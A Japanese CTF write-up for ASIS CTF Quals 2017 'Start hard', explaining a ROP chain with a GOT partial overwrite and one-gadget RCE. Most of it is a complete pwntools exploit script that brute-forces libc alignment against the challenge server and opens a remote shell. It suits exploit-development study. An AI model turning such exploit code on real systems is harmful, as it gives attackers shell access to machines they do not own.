---
layout: post
redirect_from:
  - /blog/2017/04/10/asis-ctf-quals-2017-start-hard/
date: "2017-04-10T02:45:37+09:00"
tags: [ "ctf", "writeup", "asis-ctf", "pwn", "one-gadget-rce" ]
"target_url": [ "https://asis-ctf.ir/challenges/" ]
---

# ASIS CTF Quals 2017: Start hard

<https://github.com/david942j/one_gadget> 便利だった。

## problem

Start がNX enabledになったもの。

## solution

shellcodeが使えないのでone-gadget RCEする。
libcは与えられてないので推測からのpartial writeで`read` $\to$ `write`して確認。
`read`のGOTをpartial writeして踏む。
libc baseの下位がちょうどいいものになるまでガチャをする。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='128.199.152.175')
parser.add_argument('port', nargs='?', default=10001, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='start_hard')
args = parser.parse_args()
context.log_level = args.log_level
context.binary = args.binary

elf = ELF(args.binary)
libc_csu_init_a = 0x4005a0
libc_csu_init_b = 0x4005ba

libc_read  = 0xf6670
libc_write = 0xf66d0
one_gadget_rce = 0xf0567

# $ md5sum /lib/x86_64-linux-gnu/libc.so.6
# eea5f41864be6e7b95da2f33f3dec47f  /lib/x86_64-linux-gnu/libc.so.6
# $ one_gadget /lib/x86_64-linux-gnu/libc.so.6
# 0xf0567	execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

while True:
    # with process(args.binary) as p:
    with remote(args.host, args.port) as p:

        payload = ''
        payload += 'A' * 16
        payload += 'A' * 8 # rbp
        payload += p64(libc_csu_init_b)
        payload += p64(0) # rbx
        payload += p64(1) # rbp
        payload += p64(elf.got['read']) # r12 -> rip
        payload += p64(2) # r13 -> rdx
        payload += p64(elf.got['read']) # r14 -> rsi
        payload += p64(0) # r15 -> edi, stdin
        payload += p64(libc_csu_init_a)
        payload += 'A' * 8 # add 8
        payload += 'A' * 8 # rbx
        payload += 'A' * 8 # rbp
        payload += 'A' * 8 # r12
        payload += 'A' * 8 # r13
        payload += 'A' * 8 # r14
        payload += 'A' * 8 # r15
        payload += p64(elf.plt['read'])
        payload += '\0' * 0x100
        p.send(payload)

        time.sleep(0.3)
        p.send(chr(0x67) + chr(0x05))

        try:
            time.sleep(0.3)
            p.sendline('id')
            p.recvline()
        except:
            pass
        else:
            p.interactive()
            break
```

